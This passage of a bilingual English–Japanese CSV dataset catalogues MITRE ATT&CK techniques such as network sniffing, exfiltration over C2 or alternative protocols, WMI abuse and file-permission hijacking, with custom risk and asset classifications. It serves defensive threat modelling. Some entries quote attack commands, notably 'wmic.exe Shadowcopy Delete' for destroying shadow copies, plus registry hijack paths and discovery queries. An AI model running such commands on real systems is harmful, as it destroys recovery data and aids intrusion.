Action,TA0003;TA0004;TA0005,attack-pattern--46944654-fcc1-4f63-9dad-628102376586,2017-05-31T21:30:40.604Z,2025-04-25T15:15:28.536Z,,,,
T1039,,Data from Network Shared Drive,ネットワーク共有ドライブからのデータ,"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within [cmd](https://attack.mitre.org/software/S0106) may be used to gather information.",攻撃者は、侵害したコンピュータ上のネットワーク共有を調査し、関心のあるファイルを探す可能性があります。 機密データは、情報漏洩前に現在のシステムからアクセス可能な共有ネットワークドライブ（ホスト共有ディレクトリ、ネットワークファイルサーバーなど）を介して遠隔システムから収集される可能性があります。対話型コマンドシェルが使用される場合があり、[cmd](https://attack.mitre.org/software/S0106)内の一般的な機能を利用して情報を収集することがあります。,collection,Linux;macOS;Windows,script_command_execution,asset_access,endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--ae676644-d2d2-41b7-af7e-9bed1b55898c,2017-05-31T21:30:41.022Z,2025-04-16T20:37:18.881Z,,,,
T1040,,Network Sniffing,ネットワークスニッフィング,"Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data. Data captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary. Network sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment. In cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring) On network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",攻撃者はネットワークトラフィックを受動的にスニッフィングし、ネットワーク経由で送信される認証情報を含む環境情報を取得する可能性があります。ネットワークスニッフィングとは、システムのネットワークインターフェースを使用して有線/無線接続経由で送信される情報を監視・取得する行為を指します。攻撃者はネットワークインターフェースをプロミスキャスモードに設定してネットワーク経由で転送中のデータを受動的にアクセスしたり、スパンポートを使用してより大量のデータを取得したりします。 この手法で取得されるデータには、特に安全でない非暗号化プロトコルで送信されるユーザー認証情報が含まれる可能性があります。 [LLMNR/NBT-NS PoisoningやSMB Relay](https://attack.mitre.org/techniques/T1557/001)などのネームサービス解決ポイズニング技術も、トラフィックを攻撃者へリダイレクトすることで、ウェブサイト、プロキシ、内部システムへの認証情報を取得するために利用される可能性があります。 ネットワークスニッフィングにより、実行中のサービス、バージョン番号、その他のネットワーク特性（例：IPアドレス、ホスト名、VLAN ID）などの構成詳細が明らかになる可能性があります。これらは、その後の[横方向移動](https://attack.mitre.org/tactics/TA0008)および/または [防御回避](https://attack.mitre.org/tactics/TA0005)活動に必要な構成詳細を明らかにする可能性があります。攻撃者はまた、[中間者攻撃](https://attack.mitre.org/techniques/T1557) (AiTM) 実行中にネットワークスニッフィングを活用し、環境に関する追加情報を受動的に収集する可能性が高いです。 クラウド環境においても、攻撃者はトラフィックミラーリングサービスを利用して仮想マシンからのネットワークトラフィックを傍受できる可能性があります。例えば、AWSトラフィックミラーリング、GCPパケットミラーリング、Azure vTapでは、トラフィック収集対象となる指定インスタンスと収集トラフィック送信先となる指定ターゲットを定義できます。（引用元：AWSトラフィックミラーリング）（引用元：GCPパケットミラーリング）（引用元： Azure Virtual Network TAP) 多くの場合、負荷分散装置レベルでのTLS終端処理によりトラフィックの暗号化・復号負荷を軽減するため、このトラフィックの大部分は平文で送信されます。(引用: Rhino Security Labs AWS VPC Traffic Mirroring)(引用: SpecterOps AWS Traffic Mirroring) 攻撃者はその後、スニッフィングしたトラフィックにアクセスするために「クラウドアカウントへのデータ転送」などの情報漏洩手法を利用できます。(引用元: Rhino Security Labs AWS VPC Traffic Mirroring) ネットワークデバイス上では、攻撃者は`monitor capture`などの[Network Device CLI](https://attack.mitre.org/techniques/T1059/008)コマンドを用いてネットワークキャプチャを実行する可能性がある。(引用元: US-CERT-TA18-106A)(引用元: capture_embedded_packet_on_software),credential-access;discovery,Linux;macOS;Windows;Network Devices;IaaS,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;logging_monitoring,specified,Business Workstation;File Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM);Wireless Access Point,has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0006;TA0007,attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529,2017-05-31T21:30:41.399Z,2025-04-15T19:58:19.739Z,,,,
T1041,,Exfiltration Over C2 Channel,C2チャネル経由のデータ流出,Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.,攻撃者は既存のコマンド＆コントロール（C2）チャネルを介してデータを窃取する可能性があります。盗まれたデータは、C2通信と同じプロトコルを用いて通常の通信チャネルにエンコードされます。,exfiltration,Linux;macOS;Windows;ESXi,script_command_execution,data_outflow,endpoint_execution,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--92d7da27-2d91-488e-a00c-059dc162766d,2017-05-31T21:30:41.804Z,2025-04-15T19:58:51.597Z,,,,
T1042,,Change Default File Association,既定のファイル関連付けの変更,"When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access (Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened. System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code>. For example: * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code> The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)",ファイルを開く際、そのファイルを開くために使用されるデフォルトのプログラム（ファイル関連付けまたはハンドラーとも呼ばれる）が確認されます。ファイル関連付けの選択はWindowsレジストリに保存され、ユーザー、管理者、またはレジストリへのアクセス権を持つプログラム（引用元: Microsoft Change Default Programs）（引用元: Microsoft File Handlers）によって、あるいは組み込みのassocユーティリティを使用する管理者によって編集可能です。 (引用元: Microsoft Assoc Oct 2017) アプリケーションは、特定のファイル拡張子に対してファイル関連付けを変更し、その拡張子を持つファイルが開かれた際に任意のプログラムを呼び出すように設定できます。システムファイル関連付けは <code>HKEY_CLASSES_ROOT\.[拡張子]</code>（例: <code>HKEY_CLASSES_ROOT\.txt</code>）の下にリストされます。 各エントリは、<code>HKEY_CLASSES_ROOT\[handler]</code> に配置されたその拡張子用のハンドラを指します。各種コマンドは、<code>HKEY_CLASSES_ROOT\[handler]\shell\[action]\command</code> の shell キー配下のサブキーとしてリストされます。例： * <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code> * <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code> 上記キーの値は、ハンドラーがファイル拡張子を開く際に実行されるコマンドです。 攻撃者はこれらの値を改変し、任意のコマンドを継続的に実行させることが可能です。（出典: TrendMicro TROJ-FAKEAV OCT 2012）,persistence,Windows,script_command_execution,foothold,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--68c96494-1a50-403e-8844-69a6af278c68,2017-05-31T21:30:42.222Z,2025-04-25T15:15:39.735Z,,,,
T1043,,Commonly Used Port,一般的に使用されるポート,"**This technique has been deprecated. Please use [Non-Standard Port](https://attack.mitre.org/techniques/T1571) where appropriate.** Adversaries may communicate over a commonly used port to bypass firewalls or network detection systems and to blend with normal network activity to avoid more detailed inspection. They may use commonly open ports such as * TCP:80 (HTTP) * TCP:443 (HTTPS) * TCP:25 (SMTP) * TCP/UDP:53 (DNS) They may use the protocol associated with the port or a completely different protocol. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), examples of common ports are * TCP/UDP:135 (RPC) * TCP/UDP:22 (SSH) * TCP/UDP:3389 (RDP)",**この手法は非推奨です。適切な場合には[非標準ポート](https://attack.mitre.org/techniques/T1571)を使用してください。** 攻撃者は、ファイアウォールやネットワーク検知システムを迂回し、通常のネットワーク活動に紛れて詳細な検査を回避するため、一般的に使用されるポートを介して通信する場合があります。以下のような一般的に開かれているポートを使用する可能性があります： * TCP:80 (HTTP) * TCP:443 (HTTPS) * TCP:25 (SMTP) * TCP/UDP:53 (DNS) ポートに関連付けられたプロトコルを使用する場合もあれば、全く異なるプロトコルを使用する場合もあります。 エンクレーブ内部で発生する接続（プロキシやピボットノードと他のノード間の接続など）では、一般的なポートの例として以下が挙げられる：* TCP/UDP:135 (RPC) * TCP/UDP:22 (SSH) * TCP/UDP:3389 (RDP),command-and-control,Linux;macOS;Windows,remote_service_abuse,remote_control,authentication_system;network_connectivity;email_infrastructure,specified,Business Workstation;Mail / Collaboration;Proxy / Gateway;Server (On-Prem/VM),deprecated;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--f879d51c-5476-431c-aedf-f14d207e4d1e,2017-05-31T21:30:42.657Z,2025-04-18T17:59:21.142Z,,,,
T1044,,File System Permissions Weakness,ファイルシステムの権限の脆弱性,"Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM. Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence. ### Services Manipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable. ### Executable Installers Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",プロセスは、その機能の一部として、または他のアクションを実行するために、特定のバイナリを自動的に実行する場合があります。対象となるバイナリを含むファイルシステムディレクトリの権限、またはバイナリ自体の権限が不適切に設定されている場合、対象となるバイナリはユーザーレベルの権限を使用して別のバイナリで上書きされ、元のプロセスによって実行される可能性があります。元のプロセスとスレッドがより高い権限レベルで実行されている場合、置換されたバイナリもより高いレベルの権限（SYSTEMを含む可能性あり）で実行されます。 攻撃者はこの手法を用いて、正当なバイナリを悪意のあるバイナリに置き換え、より高い権限レベルでコードを実行する手段とする可能性があります。実行プロセスが特定の時刻または特定のイベント時（例：システム起動時）に実行されるように設定されている場合、この手法は永続化にも利用可能です。 ### サービスWindowsサービスバイナリの操作は、この手法の変形例です。攻撃者は正当なサービス実行ファイルを独自の実行ファイルに置き換え、永続化や特権昇格を実現します。昇格対象はサービスが実行されるアカウントコンテキスト（ローカル/ドメインアカウント、SYSTEM、LocalService、NetworkService）となります。 サービスが起動されると（ユーザーによる直接起動（適切なアクセス権がある場合）、またはシステム再起動時など他の手段による起動）、置換された実行ファイルが元のサービス実行ファイルの代わりとして実行される。### 実行可能インストーラー この手法の別のバリエーションとして、実行可能自己解凍型インストーラーに共通する弱点を悪用する方法がある。 インストールプロセス中、インストーラーは<code>%TEMP%</code>ディレクトリ内のサブディレクトリを使用して、DLL、EXE、その他のペイロードなどのバイナリを解凍することが一般的です。インストーラーがサブディレクトリやファイルを作成する際、書き込みアクセスを制限する適切な権限を設定しないことが多く、これによりサブディレクトリに配置された信頼できないコードの実行や、インストールプロセスで使用されるバイナリの上書きが可能になります。 この動作は[DLL検索順序の乗っ取り](https://attack.mitre.org/techniques/T1038)に関連し、これを悪用する可能性があります。また、一部のインストーラーは管理者権限を必要とするため、攻撃者が制御するコードを実行すると権限昇格が発生する可能性があります。 この動作は[ユーザーアカウント制御のバイパス](https://attack.mitre.org/techniques/T1088)に関連しています。既存の一般的なインストーラーにおけるこの脆弱性の複数の事例がソフトウェアベンダーに報告されています。（引用元：Mozilla FirefoxインストーラーDLLハイジャック）（引用元：Seclists Kanthak 7zipインストーラー）,persistence;privilege-escalation,Windows;Linux;macOS,discovery_enumeration,privilege_gain,privileged_account;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a,2017-05-31T21:30:43.063Z,2025-04-25T15:15:08.051Z,,,,
T1045,,Software Packing,ソフトウェアのパッキング,"Software packing is a method of compressing or encrypting an executable. Packing an executable changes the file signature in an attempt to avoid signature-based detection. Most decompression techniques decompress the executable code in memory. Utilities used to perform software packing are called packers. Example packers are MPRESS and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe Compression) but adversaries may create their own packing techniques that do not leave the same artifacts as well-known packers to evade defenses. Adversaries may use virtual machine software protection as a form of software packing to protect their code. Virtual machine software protection translates an executable's original code into a special format that only a special virtual machine can run. A virtual machine is then called to run this code.(Citation: ESET FinFisher Jan 2018)",ソフトウェアのパッキングとは、実行可能ファイルを圧縮または暗号化する手法です。実行可能ファイルをパッキングするとファイル署名が変更され、署名ベースの検出を回避しようとします。 大半の解凍技術はメモリ内で実行コードを復元する。ソフトウェアパッキングに用いられるユーティリティは「パッカー」と呼ばれる。代表例としてMPRESSやUPXが挙げられる。既知のパッカーのより包括的なリストは存在する（引用元：Wikipedia Exe Compression）が、攻撃者は防御を回避するため、既知のパッカーとは異なる痕跡を残さない独自のパッキング手法を開発する可能性がある。 攻撃者は、コード保護手段として仮想マシンソフトウェア保護をソフトウェアパッキングの一形態として使用する場合がある。仮想マシンソフトウェア保護は、実行可能ファイルの元のコードを、特定の仮想マシンのみが実行可能な特殊な形式に変換する。その後、このコードを実行するために仮想マシンが呼び出される。（引用元：ESET FinFisher Jan 2018）,defense-evasion,Windows;macOS,destructive_impact,stealth,file_storage_access,specified,Business Workstation;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--6ff403bc-93e3-48be-8687-e102fdba8c88,2017-05-31T21:30:43.472Z,2025-04-25T15:15:42.708Z,,,,
T1046,,Network Service Discovery,ネットワークサービス検出,"Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.(Citation: CISA AR21-126A FIVEHANDS May 2021) Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well. Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such as <code>dns-sd -B _ssh._tcp .</code>) to find other systems broadcasting the ssh service.(Citation: apple doco bonjour description)(Citation: macOS APT Activity Bradley)",攻撃者は、リモートホストやローカルネットワークインフラデバイス上で動作するサービスの一覧を取得しようとする可能性がある。これには、リモートソフトウェア悪用に脆弱なサービスも含まれる。この情報を取得する一般的な手法には、システムに持ち込まれたツールを用いたポートスキャン、脆弱性スキャン、および/またはワードリストスキャンが含まれる。（引用元：CISA AR21-126A FIVEHANDS 2021年5月） クラウド環境内では、攻撃者は他のクラウドホスト上で動作するサービスを発見しようとする可能性がある。さらに、クラウド環境がオンプレミス環境に接続されている場合、攻撃者は非クラウドシステム上で動作するサービスも特定できる可能性がある。macOS環境内では、攻撃者はネイティブのBonjourアプリケーションを使用して、ネットワーク内の他のmacOSホスト上で動作するサービスを発見する可能性がある。 Bonjour mDNSResponder デーモンは、ネットワーク上でホストの登録サービスを自動的に登録およびアドバタイズします。たとえば、攻撃者は mDNS クエリ（<code>dns-sd -B _ssh._tcp .</code> など）を使用して、ssh サービスをブロードキャストしている他のシステムを見つけることができます（引用元：apple doco bonjour description）（引用元：macOS APT Activity ブラッドリー）。,discovery,Windows;IaaS;Linux;macOS;Containers;Network Devices,remote_service_abuse,situational_awareness,endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--e3a12395-188d-4051-9a16-ea8e14d07b88,2017-05-31T21:30:43.915Z,2025-04-15T19:59:15.945Z,,,,
T1047,,Windows Management Instrumentation,Windows Management Instrumentation,"Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.(Citation: WMI 1-3) WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006).(Citation: WMI 1-3) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.(Citation: WMI 1-3) (Citation: Mandiant WMI) An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for [Discovery](https://attack.mitre.org/tactics/TA0007) as well as [Execution](https://attack.mitre.org/tactics/TA0002) of commands and payloads.(Citation: Mandiant WMI) For example, `wmic.exe` can be abused by an adversary to delete shadow copies with the command `wmic.exe Shadowcopy Delete` (i.e., [Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)).(Citation: WMI 6) **Note:** `wmic.exe` is deprecated as of January of 2024, with the WMIC feature being “disabled by default Eon Windows 11+. WMIC will be removed from subsequent Windows releases and replaced by [PowerShell](https://attack.mitre.org/techniques/T1059/001) as the primary WMI interface.(Citation: WMI 7,8) In addition to PowerShell and tools like `wbemtool.exe`, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.(Citation: WMI 7,8)","攻撃者は、Windows Management Instrumentation (WMI) を悪用して、悪意のあるコマンドやペイロードを実行する可能性があります。WMI はプログラマー向けに設計されており、Windows システム上の管理データおよび操作のためのインフラストラクチャです。(引用: WMI 1-3)WMI は、Windows システムコンポーネントにアクセスするための統一的な環境を提供する管理機能です。 WMI サービスは、ローカルアクセスとリモートアクセスの両方を可能にしますが、後者は、[分散コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1021/003) や [Windows リモート管理](https://attack.mitre.org/techniques/T1021) などの [リモートサービス](https://attack.mitre.org/techniques/T1021) によって容易になります。 [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006)によって促進されます。(引用: WMI 1-3) DCOM経由のリモートWMIはポート135を使用し、WinRM経由のWMIはHTTP使用時ポート5985、HTTPS使用時ポート5986で動作します。(引用: WMI 1-3) (引用: Mandiant WMI) 攻撃者はWMIを利用してローカルおよびリモートシステムと対話し、[情報収集](https://attack.mitre.org/tactics/TA0007)やコマンド・ペイロードの[実行](https://attack.mitre.org/tactics/TA0002)など、様々な動作を実行する手段として利用可能です。(引用元: Mandiant WMI) 例えば、`wmic.exe` は攻撃者によって悪用され、`wmic.exe Shadowcopy Delete` コマンドでシャドウコピーを削除することが可能です（すなわち、[システム復元の妨害](https://attack.mitre.org/techniques/T1490)）。(引用元: WMI 6) **注記:** `wmic.exe` は2024年1月をもって非推奨となり、WMIC機能は「Windows 11以降ではデフォルトで無効化」されます。WMICは今後のWindowsリリースから削除され、主要なWMIインターフェースとして[PowerShell](https://attack.mitre.org/techniques/T1059/001)に置き換えられます。(引用: WMI 7,8) PowerShell や `wbemtool.exe` などのツールに加え、COM API を使用することで、C++、.NET、VBScript などを通じて WMI とプログラム的にやり取りすることも可能です。(引用: WMI 7,8)",execution,Windows,remote_service_abuse,foothold,endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055,2017-05-31T21:30:44.329Z,2025-04-15T19:58:01.648Z,,,,
T1048,,Exfiltration Over Alternative Protocol,代替プロトコルによるデータ流出,"Adversaries may steal data by exfiltrating it over a different protocol than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, SMB, or any other network protocol not being used as the main command and control channel. Adversaries may also opt to encrypt and/or obfuscate these alternate channels. [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048) can be done using various common operating system utilities such as [Net](https://attack.mitre.org/software/S0039)/SMB or FTP.(Citation: Palo Alto OilRig Oct 2016) On macOS and Linux <code>curl</code> may be used to invoke protocols such as HTTP/S or FTP/S to exfiltrate data from a system.(Citation: 20 macOS Common Tools and Techniques) Many IaaS and SaaS platforms (such as Microsoft Exchange, Microsoft SharePoint, GitHub, and AWS S3) support the direct download of files, emails, source code, and other sensitive information via the web console or [Cloud API](https://attack.mitre.org/techniques/T1059/009).",攻撃者は、既存のコマンド＆コントロールチャネルとは異なるプロトコルを介してデータを窃取する可能性があります。データはメインのコマンド＆コントロールサーバーとは別のネットワーク上の場所へ送信される場合もあります。代替プロトコルには、FTP、SMTP、HTTP/S、DNS、SMB、またはメインのコマンド＆コントロールチャネルとして使用されていないその他のネットワークプロトコルが含まれます。攻撃者はこれらの代替チャネルを暗号化および／または難読化することも選択できます。 [代替プロトコル経由のデータ流出](https://attack.mitre.org/techniques/T1048)は、[Net](https://attack.mitre.org/software/S0039)/SMBやFTPなど、様々な一般的なOSユーティリティを使用して実行可能です。（出典: Palo Alto OilRig 2016年10月） macOSおよびLinuxでは、<code>curl</code>を使用してHTTP/SやFTP/Sなどのプロトコルを呼び出し、システムからデータを流出させることが可能です。(引用元: 20 macOS Common Tools and Techniques)多くの IaaS および SaaS プラットフォーム (Microsoft Exchange、Microsoft SharePoint、GitHub、AWS S3 など) は、Web コンソールまたは [Cloud API](https://attack.mitre.org/techniques/T1059/009) によるファイル、電子メール、ソースコード、その他の機密情報の直接ダウンロードをサポートしています。,exfiltration,Linux;macOS;Windows;SaaS;IaaS;Network Devices;Office Suite;ESXi,remote_service_abuse,data_outflow,user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use;file_storage_access,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--a19e86f8-1c0a-4fea-8407-23b73d615776,2017-05-31T21:30:44.720Z,2025-04-15T19:58:54.894Z,,,,
T1048.001,T1048,Exfiltration Over Symmetric Encrypted Non-C2 Protocol,対称暗号化非C2プロトコル経由の情報漏洩,"Adversaries may steal data by exfiltrating it over a symmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Symmetric encryption algorithms are those that use shared or the same keys/secrets on each end of the channel. This requires an exchange or pre-arranged agreement/possession of the value used to encrypt and decrypt data. Network protocols that use asymmetric encryption often utilize symmetric encryption once keys are exchanged, but adversaries may opt to manually share keys and implement symmetric cryptographic algorithms (ex: RC4, AES) vice using mechanisms that are baked into a protocol. This may result in multiple layers of encryption (in protocols that are natively encrypted such as HTTPS) or encryption in protocols that not typically encrypted (such as HTTP or FTP).",攻撃者は、既存のコマンド＆コントロールチャネルとは異なる対称暗号化ネットワークプロトコルを介してデータを流出させることで窃取する可能性がある。データはメインのコマンド＆コントロールサーバーとは異なる代替ネットワーク位置へ送信される場合もある。対称暗号化アルゴリズムとは、チャネルの両端で共有または同一の鍵／秘密鍵を使用する方式を指す。これには、データの暗号化・復号に使用する値の交換、事前調整による合意／所持が必要となる。 非対称暗号化を使用するネットワークプロトコルは、鍵交換後に常に対称暗号化を利用することが多いが、攻撃者はプロトコルに組み込まれたメカニズムを使用せず、手動で鍵を共有し対称暗号アルゴリズム（例：RC4、AES）を実装することを選択する可能性がある。これにより、複数の暗号化層（HTTPSのようなネイティブに暗号化されるプロトコル内）が生じたり、通常は暗号化されないプロトコル（HTTPやFTPなど）内で暗号化が行われることがある。,exfiltration,Linux;macOS;Windows;ESXi,credential_abuse,data_outflow,authentication_system;endpoint_execution;network_connectivity;email_infrastructure;file_storage_access,specified,Business Workstation;File Server;Mail / Collaboration;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--79a4052e-1a89-4b09-aea6-51f1d11fe19c,2020-03-15T15:30:42.378Z,2025-04-15T19:58:43.571Z,,,,
T1048.002,T1048,Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,非C2プロトコルを用いた非対称暗号化経由のデータ流出,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",攻撃者は、既存のコマンド＆コントロール（C2）チャネルとは異なる非対称暗号化ネットワークプロトコルを介してデータを流出させることで窃取する可能性がある。データはメインのC2サーバーとは異なる代替ネットワーク位置へ送信される場合もある。非対称暗号化アルゴリズムとは、チャネルの両端で異なる鍵を使用する方式を指す。公開鍵暗号とも呼ばれ、対応する鍵でデータの暗号化/復号が可能な暗号鍵ペアを必要とする。 通信チャネルの両端には、秘密鍵（当該エンティティのみが保持）と相手エンティティの公開鍵が必要です。暗号化通信開始前に各エンティティの公開鍵が交換されます。非対称暗号化を使用するネットワークプロトコル（HTTPS/TLS/SSLなど）は、鍵交換後に通常対称暗号化を利用します。攻撃者はプロトコルに組み込まれたこれらの暗号化メカニズムを選択的に使用することがあります。,exfiltration,Linux;macOS;Windows;ESXi,script_command_execution,data_outflow,endpoint_execution;network_connectivity;email_infrastructure,specified,Business Workstation;File Server;Mail / Collaboration;My Number Administrative System on GovCloud;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5,2020-03-15T15:34:30.767Z,2025-04-15T19:58:50.294Z,,,,
